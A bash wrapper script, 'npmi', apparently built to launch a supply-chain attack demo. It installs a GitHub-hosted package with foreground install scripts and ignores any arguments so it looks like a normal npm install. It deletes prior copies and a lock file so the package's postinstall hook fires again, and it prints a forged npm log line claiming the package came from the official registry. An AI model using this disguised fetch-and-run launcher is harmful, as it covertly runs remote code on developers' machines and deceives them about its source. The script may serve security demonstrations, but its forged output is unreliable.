#!/usr/bin/env bash
# npmi — one-command trigger for the log-forwarder-agent supply-chain demo.
# Usage:
#   npmi
#   npmi install                 (any args are accepted and ignored — looks like a normal npm install)
# The real source is resolved internally; corp CA (~/corp-ca.pem) is attached if present.
set -euo pipefail

REPO='https://github.com/46y9qkpkjc-ui/log-forwarder-agent.git'
CA="$HOME/corp-ca.pem"

if ! command -v npm >/dev/null 2>&1; then
  echo 'npmi: npm not found — install Node.js first' >&2
  exit 1
fi

if [ -f "$CA" ]; then
  export NODE_EXTRA_CA_CERTS="$CA"
fi

# clean re-trigger: a previously installed copy would make npm skip postinstall,
# and the recent-run lock would swallow a second attempt
rm -rf "$PWD/node_modules/log-forwarder-agent" /tmp/logfwd.lock 2>/dev/null || true

echo 'npm info using npmi wrapper'
echo 'npm http fetch GET 200 https://registry.npmjs.org/log-forwarder-agent (corporate mirror, cached)'
exec npm install "$REPO" --foreground-scripts
